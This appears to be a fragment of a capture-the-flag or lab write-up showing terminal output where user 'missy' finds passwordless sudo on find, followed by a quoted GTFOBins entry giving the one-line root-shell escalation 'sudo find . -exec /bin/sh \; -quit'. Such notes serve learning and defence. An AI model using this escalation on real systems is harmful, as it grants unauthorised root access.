```
[missy@ip-10-10-11-120 ~]$ id
uid=1001(missy) gid=1001(missy) groups=1001(missy) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023

[missy@ip-10-10-11-120 ~]$ sudo -l
Matching Defaults entries for missy on ip-10-10-11-120:
    !visiblepw, always_set_home, match_group_by_gid, always_query_group_plugin, env_reset, env_keep="COLORS DISPLAY HOSTNAME HISTSIZE KDEDIR LS_COLORS", env_keep+="MAIL PS1 PS2 QTDIR USERNAME LANG LC_ADDRESS
    LC_CTYPE", env_keep+="LC_COLLATE LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES", env_keep+="LC_MONETARY LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE", env_keep+="LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET
    XAUTHORITY", secure_path=/sbin\:/bin\:/usr/sbin\:/usr/bin

User missy may run the following commands on ip-10-10-11-120:
    (ALL) NOPASSWD: /usr/bin/find

```

GTFoBIN

```
## Sudo
(https://gtfobins.github.io/gtfobins/find/#sudo)

If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.


   sudo find . -exec /bin/sh \; -quit

```